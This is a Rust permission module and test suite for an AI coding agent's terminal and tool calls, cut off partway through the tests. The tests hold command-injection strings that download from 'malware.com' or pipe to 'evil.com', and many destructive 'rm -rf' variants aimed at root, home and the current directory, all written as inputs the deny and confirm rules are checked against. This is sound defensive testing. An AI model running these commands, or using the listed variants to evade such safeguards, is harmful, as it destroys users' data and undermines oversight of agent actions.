pub use agent_settings::{
    ToolPermissionDecision, ToolPermissions, decide_tool_permission, normalize_path,
};

use agent_settings::AgentSettings;
use util::shell::ShellKind;

/// Convenience wrapper that extracts permission settings from `AgentSettings`.
///
/// This is the primary entry point for tools to check permissions. It extracts
/// `tool_permissions` and `always_allow_tool_actions` from the settings and
/// delegates to [`decide_tool_permission`], using the system shell.
pub fn decide_permission_from_settings(
    tool_name: &str,
    input: &str,
    settings: &AgentSettings,
) -> ToolPermissionDecision {
    decide_tool_permission(
        tool_name,
        input,
        &settings.tool_permissions,
        settings.always_allow_tool_actions,
        ShellKind::system(),
    )
}

/// Decides permission by checking both the raw input path and a simplified/canonicalized
/// version. Returns the most restrictive decision (Deny > Confirm > Allow).
pub fn decide_permission_for_path(
    tool_name: &str,
    raw_path: &str,
    settings: &AgentSettings,
) -> ToolPermissionDecision {
    let raw_decision = decide_permission_from_settings(tool_name, raw_path, settings);

    let simplified = normalize_path(raw_path);
    if simplified == raw_path {
        return raw_decision;
    }

    let simplified_decision = decide_permission_from_settings(tool_name, &simplified, settings);

    most_restrictive(raw_decision, simplified_decision)
}

fn most_restrictive(
    a: ToolPermissionDecision,
    b: ToolPermissionDecision,
) -> ToolPermissionDecision {
    match (&a, &b) {
        (ToolPermissionDecision::Deny(_), _) => a,
        (_, ToolPermissionDecision::Deny(_)) => b,
        (ToolPermissionDecision::Confirm, _) | (_, ToolPermissionDecision::Confirm) => {
            ToolPermissionDecision::Confirm
        }
        _ => a,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::AgentTool;
    use crate::pattern_extraction::extract_terminal_pattern;
    use crate::tools::{EditFileTool, TerminalTool};
    use agent_settings::{AgentProfileId, CompiledRegex, InvalidRegexPattern, ToolRules};
    use gpui::px;
    use settings::{
        DefaultAgentView, DockPosition, DockSide, NotifyWhenAgentWaiting, ToolPermissionMode,
    };
    use std::sync::Arc;

    fn test_agent_settings(
        tool_permissions: ToolPermissions,
        always_allow_tool_actions: bool,
    ) -> AgentSettings {
        AgentSettings {
            enabled: true,
            button: true,
            dock: DockPosition::Right,
            agents_panel_dock: DockSide::Left,
            default_width: px(300.),
            default_height: px(600.),
            default_model: None,
            inline_assistant_model: None,
            inline_assistant_use_streaming_tools: false,
            commit_message_model: None,
            thread_summary_model: None,
            inline_alternatives: vec![],
            favorite_models: vec![],
            default_profile: AgentProfileId::default(),
            default_view: DefaultAgentView::Thread,
            profiles: Default::default(),
            always_allow_tool_actions,
            notify_when_agent_waiting: NotifyWhenAgentWaiting::default(),
            play_sound_when_agent_done: false,
            single_file_review: false,
            model_parameters: vec![],
            enable_feedback: false,
            expand_edit_card: true,
            expand_terminal_card: true,
            cancel_generation_on_terminal_stop: true,
            use_modifier_to_send: true,
            message_editor_min_lines: 1,
            tool_permissions,
            show_turn_stats: false,
        }
    }

    fn pattern(command: &str) -> &'static str {
        Box::leak(
            extract_terminal_pattern(command)
                .expect("failed to extract pattern")
                .into_boxed_str(),
        )
    }

    struct PermTest {
        tool: &'static str,
        input: &'static str,
        mode: ToolPermissionMode,
        allow: Vec<(&'static str, bool)>,
        deny: Vec<(&'static str, bool)>,
        confirm: Vec<(&'static str, bool)>,
        global: bool,
        shell: ShellKind,
    }

    impl PermTest {
        fn new(input: &'static str) -> Self {
            Self {
                tool: TerminalTool::NAME,
                input,
                mode: ToolPermissionMode::Confirm,
                allow: vec![],
                deny: vec![],
                confirm: vec![],
                global: false,
                shell: ShellKind::Posix,
            }
        }

        fn tool(mut self, t: &'static str) -> Self {
            self.tool = t;
            self
        }
        fn mode(mut self, m: ToolPermissionMode) -> Self {
            self.mode = m;
            self
        }
        fn allow(mut self, p: &[&'static str]) -> Self {
            self.allow = p.iter().map(|s| (*s, false)).collect();
            self
        }
        fn allow_case_sensitive(mut self, p: &[&'static str]) -> Self {
            self.allow = p.iter().map(|s| (*s, true)).collect();
            self
        }
        fn deny(mut self, p: &[&'static str]) -> Self {
            self.deny = p.iter().map(|s| (*s, false)).collect();
            self
        }
        fn deny_case_sensitive(mut self, p: &[&'static str]) -> Self {
            self.deny = p.iter().map(|s| (*s, true)).collect();
            self
        }
        fn confirm(mut self, p: &[&'static str]) -> Self {
            self.confirm = p.iter().map(|s| (*s, false)).collect();
            self
        }
        fn global(mut self, g: bool) -> Self {
            self.global = g;
            self
        }
        fn shell(mut self, s: ShellKind) -> Self {
            self.shell = s;
            self
        }

        fn is_allow(self) {
            assert_eq!(
                self.run(),
                ToolPermissionDecision::Allow,
                "expected Allow for '{}'",
                self.input
            );
        }
        fn is_deny(self) {
            assert!(
                matches!(self.run(), ToolPermissionDecision::Deny(_)),
                "expected Deny for '{}'",
                self.input
            );
        }
        fn is_confirm(self) {
            assert_eq!(
                self.run(),
                ToolPermissionDecision::Confirm,
                "expected Confirm for '{}'",
                self.input
            );
        }

        fn run(&self) -> ToolPermissionDecision {
            let mut tools = collections::HashMap::default();
            tools.insert(
                Arc::from(self.tool),
                ToolRules {
                    default_mode: self.mode,
                    always_allow: self
                        .allow
                        .iter()
                        .filter_map(|(p, cs)| CompiledRegex::new(p, *cs))
                        .collect(),
                    always_deny: self
                        .deny
                        .iter()
                        .filter_map(|(p, cs)| CompiledRegex::new(p, *cs))
                        .collect(),
                    always_confirm: self
                        .confirm
                        .iter()
                        .filter_map(|(p, cs)| CompiledRegex::new(p, *cs))
                        .collect(),
                    invalid_patterns: vec![],
                },
            );
            decide_tool_permission(
                self.tool,
                self.input,
                &ToolPermissions { tools },
                self.global,
                self.shell,
            )
        }
    }

    fn t(input: &'static str) -> PermTest {
        PermTest::new(input)
    }

    fn no_rules(input: &str, global: bool) -> ToolPermissionDecision {
        decide_tool_permission(
            TerminalTool::NAME,
            input,
            &ToolPermissions {
                tools: collections::HashMap::default(),
            },
            global,
            ShellKind::Posix,
        )
    }

    // allow pattern matches
    #[test]
    fn allow_exact_match() {
        t("cargo test").allow(&[pattern("cargo")]).is_allow();
    }
    #[test]
    fn allow_one_of_many_patterns() {
        t("npm install")
            .allow(&[pattern("cargo"), pattern("npm")])
            .is_allow();
        t("git status")
            .allow(&[pattern("cargo"), pattern("npm"), pattern("git")])
            .is_allow();
    }
    #[test]
    fn allow_middle_pattern() {
        t("run cargo now").allow(&["cargo"]).is_allow();
    }
    #[test]
    fn allow_anchor_prevents_middle() {
        t("run cargo now").allow(&["^cargo"]).is_confirm();
    }

    // allow pattern doesn't match -> falls through
    #[test]
    fn allow_no_match_confirms() {
        t("python x.py").allow(&[pattern("cargo")]).is_confirm();
    }
    #[test]
    fn allow_no_match_global_allows() {
        t("python x.py")
            .allow(&[pattern("cargo")])
            .global(true)
            .is_allow();
    }

    // deny pattern matches (using commands that aren't blocked by hardcoded rules)
    #[test]
    fn deny_blocks() {
        t("rm -rf ./temp").deny(&["rm\\s+-rf"]).is_deny();
    }
    #[test]
    fn global_bypasses_user_deny() {
        // always_allow_tool_actions bypasses user-configured deny rules
        t("rm -rf ./temp")
            .deny(&["rm\\s+-rf"])
            .global(true)
            .is_allow();
    }
    #[test]
    fn deny_blocks_with_mode_allow() {
        t("rm -rf ./temp")
            .deny(&["rm\\s+-rf"])
            .mode(ToolPermissionMode::Allow)
            .is_deny();
    }
    #[test]
    fn deny_middle_match() {
        t("echo rm -rf ./temp").deny(&["rm\\s+-rf"]).is_deny();
    }
    #[test]
    fn deny_no_match_falls_through() {
        t("ls -la")
            .deny(&["rm\\s+-rf"])
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    // confirm pattern matches
    #[test]
    fn confirm_requires_confirm() {
        t("sudo apt install")
            .confirm(&[pattern("sudo")])
            .is_confirm();
    }
    #[test]
    fn global_overrides_confirm() {
        t("sudo reboot")
            .confirm(&[pattern("sudo")])
            .global(true)
            .is_allow();
    }
    #[test]
    fn confirm_overrides_mode_allow() {
        t("sudo x")
            .confirm(&["sudo"])
            .mode(ToolPermissionMode::Allow)
            .is_confirm();
    }

    // confirm beats allow
    #[test]
    fn confirm_beats_allow() {
        t("git push --force")
            .allow(&[pattern("git")])
            .confirm(&["--force"])
            .is_confirm();
    }
    #[test]
    fn confirm_beats_allow_overlap() {
        t("deploy prod")
            .allow(&["deploy"])
            .confirm(&["prod"])
            .is_confirm();
    }
    #[test]
    fn allow_when_confirm_no_match() {
        t("git status")
            .allow(&[pattern("git")])
            .confirm(&["--force"])
            .is_allow();
    }

    // deny beats allow
    #[test]
    fn deny_beats_allow() {
        t("rm -rf ./tmp/x")
            .allow(&["/tmp/"])
            .deny(&["rm\\s+-rf"])
            .is_deny();
    }

    #[test]
    fn deny_beats_confirm() {
        t("sudo rm -rf ./temp")
            .confirm(&["sudo"])
            .deny(&["rm\\s+-rf"])
            .is_deny();
    }

    // deny beats everything
    #[test]
    fn deny_beats_all() {
        t("bad cmd")
            .allow(&["cmd"])
            .confirm(&["cmd"])
            .deny(&["bad"])
            .is_deny();
    }

    // no patterns -> default_mode
    #[test]
    fn default_confirm() {
        t("python x.py")
            .mode(ToolPermissionMode::Confirm)
            .is_confirm();
    }
    #[test]
    fn default_allow() {
        t("python x.py").mode(ToolPermissionMode::Allow).is_allow();
    }
    #[test]
    fn default_deny() {
        t("python x.py").mode(ToolPermissionMode::Deny).is_deny();
    }
    #[test]
    fn default_deny_global_true() {
        t("python x.py")
            .mode(ToolPermissionMode::Deny)
            .global(true)
            .is_allow();
    }

    #[test]
    fn default_confirm_global_true() {
        t("x")
            .mode(ToolPermissionMode::Confirm)
            .global(true)
            .is_allow();
    }

    #[test]
    fn no_rules_confirms_by_default() {
        assert_eq!(no_rules("x", false), ToolPermissionDecision::Confirm);
    }

    #[test]
    fn empty_input_no_match() {
        t("")
            .deny(&["rm"])
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn empty_input_with_allow_falls_to_default() {
        t("").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn multi_deny_any_match() {
        t("rm x").deny(&["rm", "del", "drop"]).is_deny();
        t("drop x").deny(&["rm", "del", "drop"]).is_deny();
    }

    #[test]
    fn multi_allow_any_match() {
        t("cargo x").allow(&["^cargo", "^npm", "^git"]).is_allow();
    }
    #[test]
    fn multi_none_match() {
        t("python x")
            .allow(&["^cargo", "^npm"])
            .deny(&["rm"])
            .is_confirm();
    }

    // tool isolation
    #[test]
    fn other_tool_not_affected() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(TerminalTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Deny,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        tools.insert(
            Arc::from(EditFileTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        let p = ToolPermissions { tools };
        // With always_allow_tool_actions=true, even default_mode: Deny is overridden
        assert_eq!(
            decide_tool_permission(TerminalTool::NAME, "x", &p, true, ShellKind::Posix),
            ToolPermissionDecision::Allow
        );
        // With always_allow_tool_actions=false, default_mode: Deny is respected
        assert!(matches!(
            decide_tool_permission(TerminalTool::NAME, "x", &p, false, ShellKind::Posix),
            ToolPermissionDecision::Deny(_)
        ));
        assert_eq!(
            decide_tool_permission(EditFileTool::NAME, "x", &p, false, ShellKind::Posix),
            ToolPermissionDecision::Allow
        );
    }

    #[test]
    fn partial_tool_name_no_match() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from("term"),
            ToolRules {
                default_mode: ToolPermissionMode::Deny,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        let p = ToolPermissions { tools };
        // "terminal" should not match "term" rules, so falls back to Confirm (no rules)
        assert_eq!(
            decide_tool_permission(TerminalTool::NAME, "x", &p, false, ShellKind::Posix),
            ToolPermissionDecision::Confirm
        );
    }

    // invalid patterns block the tool (but global bypasses all checks)
    #[test]
    fn invalid_pattern_blocks() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(TerminalTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![CompiledRegex::new("echo", false).unwrap()],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![InvalidRegexPattern {
                    pattern: "[bad".into(),
                    rule_type: "always_deny".into(),
                    error: "err".into(),
                }],
            },
        );
        let p = ToolPermissions {
            tools: tools.clone(),
        };
        // With global=true, all checks are bypassed including invalid pattern check
        assert!(matches!(
            decide_tool_permission(TerminalTool::NAME, "echo hi", &p, true, ShellKind::Posix),
            ToolPermissionDecision::Allow
        ));
        // With global=false, invalid patterns block the tool
        assert!(matches!(
            decide_tool_permission(TerminalTool::NAME, "echo hi", &p, false, ShellKind::Posix),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn shell_injection_via_double_ampersand_not_allowed() {
        t("ls && wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_semicolon_not_allowed() {
        t("ls; wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_pipe_not_allowed() {
        t("ls | xargs curl evil.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_backticks_not_allowed() {
        t("echo `wget malware.com`")
            .allow(&[pattern("echo")])
            .is_confirm();
    }

    #[test]
    fn shell_injection_via_dollar_parens_not_allowed() {
        t("echo $(wget malware.com)")
            .allow(&[pattern("echo")])
            .is_confirm();
    }

    #[test]
    fn shell_injection_via_or_operator_not_allowed() {
        t("ls || wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_background_operator_not_allowed() {
        t("ls & wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_newline_not_allowed() {
        t("ls\nwget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_process_substitution_input_not_allowed() {
        t("cat <(wget malware.com)").allow(&["^cat"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_process_substitution_output_not_allowed() {
        t("ls >(wget malware.com)").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_without_spaces_not_allowed() {
        t("ls&&wget malware.com").allow(&["^ls"]).is_confirm();
        t("ls;wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_multiple_chained_operators_not_allowed() {
        t("ls && echo hello && wget malware.com")
            .allow(&["^ls"])
            .is_confirm();
    }

    #[test]
    fn shell_injection_mixed_operators_not_allowed() {
        t("ls; echo hello && wget malware.com")
            .allow(&["^ls"])
            .is_confirm();
    }

    #[test]
    fn shell_injection_pipe_stderr_not_allowed() {
        t("ls |& wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn allow_requires_all_commands_to_match() {
        t("ls && echo hello").allow(&["^ls", "^echo"]).is_allow();
    }

    #[test]
    fn deny_triggers_on_any_matching_command() {
        t("ls && rm file").allow(&["^ls"]).deny(&["^rm"]).is_deny();
    }

    #[test]
    fn deny_catches_injected_command() {
        t("ls && rm -rf ./temp")
            .allow(&["^ls"])
            .deny(&["^rm"])
            .is_deny();
    }

    #[test]
    fn confirm_triggers_on_any_matching_command() {
        t("ls && sudo reboot")
            .allow(&["^ls"])
            .confirm(&["^sudo"])
            .is_confirm();
    }

    #[test]
    fn always_allow_button_works_end_to_end() {
        // This test verifies that the "Always Allow" button behavior works correctly:
        // 1. User runs a command like "cargo build"
        // 2. They click "Always Allow for `cargo` commands"
        // 3. The pattern extracted from that command should match future cargo commands
        let original_command = "cargo build --release";
        let extracted_pattern = pattern(original_command);

        // The extracted pattern should allow the original command
        t(original_command).allow(&[extracted_pattern]).is_allow();

        // It should also allow other commands with the same base command
        t("cargo test").allow(&[extracted_pattern]).is_allow();
        t("cargo fmt").allow(&[extracted_pattern]).is_allow();

        // But not commands with different base commands
        t("npm install").allow(&[extracted_pattern]).is_confirm();

        // And it should work with subcommand extraction (chained commands)
        t("cargo build && cargo test")
            .allow(&[extracted_pattern])
            .is_allow();

        // But reject if any subcommand doesn't match
        t("cargo build && npm install")
            .allow(&[extracted_pattern])
            .is_confirm();
    }

    #[test]
    fn nested_command_substitution_all_checked() {
        t("echo $(cat $(whoami).txt)")
            .allow(&["^echo", "^cat", "^whoami"])
            .is_allow();
    }

    #[test]
    fn parse_failure_falls_back_to_confirm() {
        t("ls &&").allow(&["^ls$"]).is_confirm();
    }

    #[test]
    fn mcp_tool_default_modes() {
        t("")
            .tool("mcp:fs:read")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("")
            .tool("mcp:bad:del")
            .mode(ToolPermissionMode::Deny)
            .is_deny();
        t("")
            .tool("mcp:gh:issue")
            .mode(ToolPermissionMode::Confirm)
            .is_confirm();
        t("")
            .tool("mcp:gh:issue")
            .mode(ToolPermissionMode::Confirm)
            .global(true)
            .is_allow();
    }

    #[test]
    fn mcp_doesnt_collide_with_builtin() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(TerminalTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Deny,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        tools.insert(
            Arc::from("mcp:srv:terminal"),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        let p = ToolPermissions { tools };
        assert!(matches!(
            decide_tool_permission(TerminalTool::NAME, "x", &p, false, ShellKind::Posix),
            ToolPermissionDecision::Deny(_)
        ));
        assert_eq!(
            decide_tool_permission("mcp:srv:terminal", "x", &p, false, ShellKind::Posix),
            ToolPermissionDecision::Allow
        );
    }

    #[test]
    fn case_insensitive_by_default() {
        t("CARGO TEST").allow(&[pattern("cargo")]).is_allow();
        t("Cargo Test").allow(&[pattern("cargo")]).is_allow();
    }

    #[test]
    fn case_sensitive_allow() {
        t("cargo test")
            .allow_case_sensitive(&[pattern("cargo")])
            .is_allow();
        t("CARGO TEST")
            .allow_case_sensitive(&[pattern("cargo")])
            .is_confirm();
    }

    #[test]
    fn case_sensitive_deny() {
        t("rm -rf ./temp")
            .deny_case_sensitive(&[pattern("rm")])
            .is_deny();
        t("RM -RF ./temp")
            .deny_case_sensitive(&[pattern("rm")])
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn nushell_allows_with_allow_pattern() {
        t("ls").allow(&["^ls"]).shell(ShellKind::Nushell).is_allow();
    }

    #[test]
    fn nushell_allows_deny_patterns() {
        t("rm -rf ./temp")
            .deny(&["rm\\s+-rf"])
            .shell(ShellKind::Nushell)
            .is_deny();
    }

    #[test]
    fn nushell_allows_confirm_patterns() {
        t("sudo reboot")
            .confirm(&["sudo"])
            .shell(ShellKind::Nushell)
            .is_confirm();
    }

    #[test]
    fn nushell_no_allow_patterns_uses_default() {
        t("ls")
            .deny(&["rm"])
            .mode(ToolPermissionMode::Allow)
            .shell(ShellKind::Nushell)
            .is_allow();
    }

    #[test]
    fn elvish_allows_with_allow_pattern() {
        t("ls").allow(&["^ls"]).shell(ShellKind::Elvish).is_allow();
    }

    #[test]
    fn rc_allows_with_allow_pattern() {
        t("ls").allow(&["^ls"]).shell(ShellKind::Rc).is_allow();
    }

    #[test]
    fn multiple_invalid_patterns_pluralizes_message() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(TerminalTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![
                    InvalidRegexPattern {
                        pattern: "[bad1".into(),
                        rule_type: "always_deny".into(),
                        error: "err1".into(),
                    },
                    InvalidRegexPattern {
                        pattern: "[bad2".into(),
                        rule_type: "always_allow".into(),
                        error: "err2".into(),
                    },
                ],
            },
        );
        let p = ToolPermissions { tools };

        let result =
            decide_tool_permission(TerminalTool::NAME, "echo hi", &p, false, ShellKind::Posix);
        match result {
            ToolPermissionDecision::Deny(msg) => {
                assert!(
                    msg.contains("2 regex patterns"),
                    "Expected '2 regex patterns' in message, got: {}",
                    msg
                );
            }
            other => panic!("Expected Deny, got {:?}", other),
        }
    }

    // Hardcoded security rules tests - these rules CANNOT be bypassed

    #[test]
    fn hardcoded_blocks_rm_rf_root() {
        t("rm -rf /").is_deny();
        t("rm -fr /").is_deny();
        t("rm -RF /").is_deny();
        t("rm -FR /").is_deny();
        t("rm -r -f /").is_deny();
        t("rm -f -r /").is_deny();
        t("RM -RF /").is_deny();
        // Long flags
        t("rm --recursive --force /").is_deny();
        t("rm --force --recursive /").is_deny();
        // Extra short flags
        t("rm -rfv /").is_deny();
        t("rm -v -rf /").is_deny();
        // Glob wildcards
        t("rm -rf /*").is_deny();
        t("rm -rf /* ").is_deny();
        // End-of-options marker
        t("rm -rf -- /").is_deny();
        t("rm -- /").is_deny();
        // Prefixed with sudo or other commands
        t("sudo rm -rf /").is_deny();
        t("sudo rm -rf /*").is_deny();
        t("sudo rm -rf --no-preserve-root /").is_deny();
    }

    #[test]
    fn hardcoded_blocks_rm_rf_home() {
        t("rm -rf ~").is_deny();
        t("rm -fr ~").is_deny();
        t("rm -rf ~/").is_deny();
        t("rm -rf $HOME").is_deny();
        t("rm -fr $HOME").is_deny();
        t("rm -rf $HOME/").is_deny();
        t("rm -rf ${HOME}").is_deny();
        t("rm -rf ${HOME}/").is_deny();
        t("rm -RF $HOME").is_deny();
        t("rm -FR ${HOME}/").is_deny();
        t("rm -R -F ${HOME}/").is_deny();
        t("RM -RF ~").is_deny();
        // Long flags
        t("rm --recursive --force ~").is_deny();
        t("rm --recursive --force ~/").is_deny();
        t("rm --recursive --force $HOME").is_deny();
        t("rm --force --recursive ${HOME}/").is_deny();
        // Extra short flags
        t("rm -rfv ~").is_deny();
        t("rm -v -rf ~/").is_deny();
        // Glob wildcards
        t("rm -rf ~/*").is_deny();
        t("rm -rf $HOME/*").is_deny();
        t("rm -rf ${HOME}/*").is_deny();
        // End-of-options marker
        t("rm -rf -- ~").is_deny();
        t("rm -rf -- ~/").is_deny();
        t("rm -rf -- $HOME").is_deny();
    }

    #[test]
    fn hardcoded_blocks_rm_rf_home_with_traversal() {
        // Path traversal after $HOME / ${HOME} should still be blocked
        t("rm -rf $HOME/./").is_deny();
        t("rm -rf $HOME/foo/..").is_deny();
        t("rm -rf ${HOME}/.").is_deny();
        t("rm -rf ${HOME}/./").is_deny();
        t("rm -rf $HOME/a/b/../..").is_deny();
        t("rm -rf ${HOME}/foo/bar/../..").is_deny();
        // Subdirectories should NOT be blocked
        t("rm -rf $HOME/subdir")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ${HOME}/Documents")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_rf_dot() {
        t("rm -rf .").is_deny();
        t("rm -fr .").is_deny();
        t("rm -rf ./").is_deny();
        t("rm -rf ..").is_deny();
        t("rm -fr ..").is_deny();
        t("rm -rf ../").is_deny();
        t("rm -RF .").is_deny();
        t("rm -FR ../").is_deny();
        t("rm -R -F ../").is_deny();
        t("RM -RF .").is_deny();
        t("RM -RF ..").is_deny();
        // Long flags
        t("rm --recursive --force .").is_deny();
        t("rm --force --recursive ../").is_deny();
        // Extra short flags
        t("rm -rfv .").is_deny();
        t("rm -v -rf ../").is_deny();
        // Glob wildcards
        t("rm -rf ./*").is_deny();
        t("rm -rf ../*").is_deny();
        // End-of-options marker
        t("rm -rf -- .").is_deny();
        t("rm -rf -- ../").is_deny();
    }

    #[test]
    fn hardcoded_cannot_be_bypassed_by_global() {
        // Even with always_allow_tool_actions=true, hardcoded rules block
        t("rm -rf /").global(true).is_deny();
        t("rm -rf ~").global(true).is_deny();
        t("rm -rf $HOME").global(true).is_deny();
        t("rm -rf .").global(true).is_deny();
        t("rm -rf ..").global(true).is_deny();
    }

    #[test]
    fn hardcoded_cannot_be_bypassed_by_allow_pattern() {
        // Even with an allow pattern that matches, hardcoded rules block
        t("rm -rf /").allow(&[".*"]).is_deny();
        t("rm -rf $HOME").allow(&[".*"]).is_deny();
        t("rm -rf .").allow(&[".*"]).is_deny();
        t("rm -rf ..").allow(&[".*"]).is_deny();
    }

    #[test]
    fn hardcoded_allows_safe_rm() {
        // rm -rf on a specific path should NOT be blocked
        t("rm -rf ./build")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf /tmp/test")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ~/Documents")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf $HOME/Documents")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ../some_dir")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf .hidden_dir")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_checks_chained_commands() {
        // Hardcoded rules should catch dangerous commands in chains
        t("ls && rm -rf /").is_deny();
        t("echo hello; rm -rf ~").is_deny();
        t("cargo build && rm -rf /").global(true).is_deny();
        t("echo hello; rm -rf $HOME").is_deny();
        t("echo hello; rm -rf .").is_deny();
        t("echo hello; rm -rf ..").is_deny();
    }

    #[test]
    fn hardcoded_blocks_rm_with_trailing_flags() {
        // GNU rm accepts flags after operands by default
        t("rm / -rf").is_deny();
        t("rm / -fr").is_deny();
        t("rm / -RF").is_deny();
        t("rm / -r -f").is_deny();
        t("rm / --recursive --force").is_deny();
        t("rm / -rfv").is_deny();
        t("rm /* -rf").is_deny();
        // Mixed: some flags before path, some after
        t("rm -r / -f").is_deny();
        t("rm -f / -r").is_deny();
        // Home
        t("rm ~ -rf").is_deny();
        t("rm ~/ -rf").is_deny();
        t("rm ~ -r -f").is_deny();
        t("rm $HOME -rf").is_deny();
        t("rm ${HOME} -rf").is_deny();
        // Dot / dotdot
        t("rm . -rf").is_deny();
        t("rm ./ -rf").is_deny();
        t("rm . -r -f").is_deny();
        t("rm .. -rf").is_deny();
        t("rm ../ -rf").is_deny();
        t("rm .. -r -f").is_deny();
        // Trailing flags in chained commands
        t("ls && rm / -rf").is_deny();
        t("echo hello; rm ~ -rf").is_deny();
        // Safe paths with trailing flags should NOT be blocked
        t("rm ./build -rf")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm /tmp/test -rf")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm ~/Documents -rf")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_with_flag_equals_value() {
        // --flag=value syntax should not bypass the rules
        t("rm --no-preserve-root=yes -rf /").is_deny();
        t("rm --no-preserve-root=yes --recursive --force /").is_deny();
        t("rm -rf --no-preserve-root=yes /").is_deny();
        t("rm --interactive=never -rf /").is_deny();
        t("rm --no-preserve-root=yes -rf ~").is_deny();
        t("rm --no-preserve-root=yes -rf .").is_deny();
        t("rm --no-preserve-root=yes -rf ..").is_deny();
        t("rm --no-preserve-root=yes -rf $HOME").is_deny();
        // --flag (without =value) should also not bypass the rules
        t("rm -rf --no-preserve-root /").is_deny();
        t("rm --no-preserve-root -rf /").is_deny();
        t("rm --no-preserve-root --recursive --force /").is_deny();
        t("rm -rf --no-preserve-root ~").is_deny();
        t("rm -rf --no-preserve-root .").is_deny();
        t("rm -rf --no-preserve-root ..").is_deny();
        t("rm -rf --no-preserve-root $HOME").is_deny();
        // Trailing --flag=value after path
        t("rm / --no-preserve-root=yes -rf").is_deny();
        t("rm ~ -rf --no-preserve-root=yes").is_deny();
        // Trailing --flag (without =value) after path
        t("rm / -rf --no-preserve-root").is_deny();
        t("rm ~ -rf --no-preserve-root").is_deny();
        // Safe paths with --flag=value should NOT be blocked
        t("rm --no-preserve-root=yes -rf ./build")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm --interactive=never -rf /tmp/test")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        // Safe paths with --flag (without =value) should NOT be blocked
        t("rm --no-preserve-root -rf ./build")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_with_path_traversal() {
        // Traversal to root via ..
        t("rm -rf /etc/../").is_deny();
        t("rm -rf /tmp/../../").is_deny();
        t("rm -rf /tmp/../..").is_deny();
        t("rm -rf /var/log/../../").is_deny();
        // Root via /./
        t("rm -rf /./").is_deny();
        t("rm -rf /.").is_deny();
        // Double slash (equivalent to /)
        t("rm -rf //").is_deny();
        // Home traversal via ~/./
        t("rm -rf ~/./").is_deny();
        t("rm -rf ~/.").is_deny();
        // Dot traversal via indirect paths
        t("rm -rf ./foo/..").is_deny();
        t("rm -rf ../foo/..").is_deny();
        // Traversal in chained commands
        t("ls && rm -rf /tmp/../../").is_deny();
        t("echo hello; rm -rf /./").is_deny();
        // Traversal cannot be bypassed by global or allow patterns
        t("rm -rf /tmp/../../").global(true).is_deny();
        t("rm -rf /./").allow(&[".*"]).is_deny();
        // Safe paths with traversal should still be allowed
        t("rm -rf /tmp/../tmp/foo")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ~/Documents/./subdir")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_multi_path_with_dangerous_last() {
        t("rm -rf /tmp /").is_deny();
        t("rm -rf /tmp/foo /").is_deny();
        t("rm -rf /var/log ~").is_deny();
        t("rm -rf /safe $HOME").is_deny();
    }

    #[test]
    fn hardcoded_blocks_rm_multi_path_with_dangerous_first() {
        t("rm -rf / /tmp").is_deny();
        t("rm -rf ~ /var/log").is_deny();
